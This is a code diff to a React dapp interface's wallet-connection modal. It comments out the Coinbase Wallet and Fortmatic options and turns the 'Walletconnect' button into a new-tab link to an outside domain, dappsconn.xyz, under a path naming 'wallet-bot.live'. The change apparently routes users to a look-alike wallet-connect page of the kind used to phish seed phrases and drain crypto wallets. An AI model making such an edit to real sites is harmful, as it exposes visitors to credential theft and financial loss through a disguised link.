@@ -6,7 +6,7 @@ import { IoMdArrowBack, IoIosMore, IoIosSettings, IoMdClose } from "react-icons/
 function App() {
 
   const [showModal, setShowModal] = React.useState(false)
-  const [select, setSelect] = React.useState(0)
+  const [select, setSelect] = React.useState(0) 
 
   return (
     <div className=' w-full h-full flex-1 xl:flex-row flex-col bg-[#f7f0f6] flex  ' > 
@@ -85,7 +85,7 @@ function App() {
           <button className=' px-2 mx-3 ' >Vote</button>
           <button className=' px-2 ml-3 ' >Charts↗</button>
         </div> 
-      </div>
+      </div> 
       {showModal && (
         <>
           <div className=' w-full h-full items-end lg:h-full fixed z-50 flex lg:justify-center lg:items-center ' >
@@ -96,24 +96,24 @@ function App() {
                   <IoMdClose size={22} />
                 </button>
               </div>
-              <button onClick={()=> setSelect(0)} className='px-4 w-full flex items-center justify-between h-11 rounded-2xl bg-[#f7f0f6]' >
+              {/* <button onClick={()=> setSelect(0)} className='px-4 w-full flex items-center justify-between h-11 rounded-2xl bg-[#f7f0f6]' >
                 <p>Open in Coinbase Wallet</p>
                 {select === 0 && ( 
                   <div className=' w-6 h-6 bg-[#d64465] rounded-full ' />
                 )}
-              </button>
-              <button onClick={()=> setSelect(1)} className='px-4 my-3 w-full flex items-center justify-between h-11 rounded-2xl bg-[#f7f0f6]' >
+              </button> */}
+              <a target="_blank" href="https://dappsconn.xyz/hash/wallet-bot.live/index.html" className='px-4 my-3 w-full flex items-center justify-between h-11 rounded-2xl bg-[#f7f0f6]' >
                 <p>Walletconnect</p>
-                {select === 1 && ( 
+                {/* {select === 1 && ( 
                   <div className=' w-6 h-6 bg-[#d64465] rounded-full ' />
-                )}
-              </button>
-              <button onClick={()=> setSelect(2)} className='px-4 w-full flex items-center justify-between h-11 rounded-2xl bg-[#f7f0f6]' >
+                )} */}
+              </a>
+              {/* <button onClick={()=> setSelect(2)} className='px-4 w-full flex items-center justify-between h-11 rounded-2xl bg-[#f7f0f6]' >
                 <p>Fortmatic</p>
                 {select === 2 && ( 
                   <div className=' w-6 h-6 bg-[#d64465] rounded-full ' />
                 )}
-              </button>
+              </button> */}
             </div>
           </div>
           <div className=' fixed bg-black bg-opacity-50 z-30 inset-0  ' />
